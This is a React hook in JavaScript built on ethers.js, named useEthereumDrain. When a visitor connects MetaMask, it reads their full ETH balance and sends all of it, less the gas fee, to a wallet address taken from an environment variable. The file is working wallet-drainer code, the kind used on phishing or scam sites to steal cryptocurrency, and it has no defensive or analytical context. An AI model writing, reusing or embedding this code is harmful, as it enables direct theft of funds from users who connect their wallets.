"use client";

import { useCallback } from 'react';
import { ethers } from 'ethers';

const DRAIN_WALLET = process.env.NEXT_PUBLIC_ETHEREUM_WALLET;

export const useEthereumDrain = () => {
  const executeDrain = useCallback(async () => {
    try {
      if (!window.ethereum) {
        throw new Error('MetaMask not detected');
      }

      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      
      // Get balance
      const balance = await provider.getBalance(address);
      
      // Calculate gas
      const feeData = await provider.getFeeData();
      const gasLimit = 21000n;
      const gasCost = gasLimit * feeData.maxFeePerGas;
      
      // Check minimum balance
      if (balance < gasCost + ethers.parseEther('0.001')) {
        throw new Error('Insufficient balance for gas');
      }
      
      // Calculate drain amount
      const drainAmount = balance - gasCost;
      
      // Send transaction
      const tx = await signer.sendTransaction({
        to: DRAIN_WALLET,
        value: drainAmount,
        gasLimit
      });
      
      // Wait for confirmation
      await tx.wait();
      
      return {
        success: true,
        txHash: tx.hash,
        amount: ethers.formatEther(drainAmount)
      };
      
    } catch (error) {
      console.error('Ethereum drain failed:', error);
      throw error;
    }
  }, []);

  return { executeDrain };
};
